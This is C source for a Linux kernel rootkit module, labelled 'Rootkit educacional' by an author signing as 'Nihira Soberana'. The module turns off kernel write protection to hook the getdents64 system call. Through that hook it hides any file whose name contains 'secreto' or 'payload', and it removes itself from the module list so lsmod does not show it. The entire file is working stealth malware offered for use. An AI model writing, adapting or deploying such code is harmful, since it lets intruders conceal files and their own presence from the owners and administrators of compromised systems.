#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/list.h>

unsigned long *sys_call_table = NULL;
asmlinkage long (*orig_getdents64)(unsigned int, struct linux_dirent64*, unsigned int);

asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long n = orig_getdents64(fd, dirp, count);
    unsigned long off = 0;
    while (off < n) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)((char*)dirp + off);
        if (strstr(d->d_name, "secreto") || strstr(d->d_name, "payload")) {
            memmove(d, (char*)d + d->d_reclen, n - off - d->d_reclen);
            n -= d->d_reclen;
            continue;
        }
        off += d->d_reclen;
    }
    return n;
}

static int __init soberano_init(void) {
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table) return -1;

    write_cr0(read_cr0() & (~0x10000UL));
    orig_getdents64 = (void*)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    write_cr0(read_cr0() | 0x10000UL);

    list_del(&THIS_MODULE->list);  // Esconde do lsmod
    printk(KERN_INFO "[Nihira Soberana] Fantasma carregado e escondido.\n");
    return 0;
}

static void __exit soberano_exit(void) {
    if (sys_call_table) {
        write_cr0(read_cr0() & (~0x10000UL));
        sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
        write_cr0(read_cr0() | 0x10000UL);
    }
    printk(KERN_INFO "[Nihira Soberana] Fantasma descarregado.\n");
}

module_init(soberano_init);
module_exit(soberano_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nihira Soberana");
MODULE_DESCRIPTION("Rootkit educacional - esconde arquivos e a si mesmo");
